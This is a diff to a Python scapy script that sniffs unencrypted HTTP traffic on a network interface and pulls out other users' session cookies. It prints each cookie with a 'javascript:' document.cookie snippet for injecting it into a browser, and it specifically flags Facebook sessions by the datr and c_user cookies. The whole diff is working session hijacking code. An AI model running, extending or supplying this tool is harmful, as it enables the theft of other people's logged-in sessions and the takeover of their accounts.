@@ -2,9 +2,7 @@
 
 import sys
 from scapy.all import *
-
-interface = sys.argv[1]	   
-profiles_seen =()
+cookies_seen =()
 
 def dictStringValue(raw_values):
 	value = raw_values.split('=')
@@ -29,16 +27,26 @@ def extractCookie(headers):
 							 
 def jsCookie(dictCookie):			
 		return ''.join(['void(document.cookie="' + key + '=' + dictCookie[key]+ '");' for key in dictCookie.keys()])		
-		
+
+def printCookie(cookie):
+	for key in cookie.keys():
+		print "%s = %s" % (key,cookie[key])
+	print "[*] Javascript Injection code:"
+	print 'javascript:' + jsCookie(cookie) + '\n'
+	
 def sniffCookies(p):  
-	 global profiles_seen
+	 global cookies_seen
 	 if 'Cookie:' in getattr(p,'load',''):
 		cookie = extractCookie(p.load)
-		if not "-f" in sys.argv:
-			print 'javascript:' + jsCookie(cookie)
-		elif cookie.has_key("datr") and cookie.has_key("c_user") and cookie["c_user"] not in profiles_seen: # We have ourselves a facebook Cookie from a unseen profile
-			profiles_seen = profiles_seen + (cookie["c_user"],) 
+		if not "-f" in sys.argv and cookie not in cookies_seen:
+			print "[+] New cookie seen: "
+			printCookie(cookie)
+		elif cookie.has_key("datr") and cookie.has_key("c_user") and cookie["c_user"] not in cookies_seen: # We have ourselves a facebook Cookie from a unseen profile 
 			print "# Found cookie for facebook user %s:" % cookie["c_user"]
-			print 'javascript:' + jsCookie(cookie)
-						 		
-sniff(iface=interface,filter="tcp port 80",prn=sniffCookies)
+			printCookie(cookie)
+			cookies_seen = cookies_seen + (cookie["c_user"],)
+		cookies_seen = cookies_seen + (cookie,)
+
+if __name__ == "__main__":						 		
+	interface = sys.argv[1]	   
+	sniff(iface=interface,filter="tcp port 80",prn=sniffCookies)
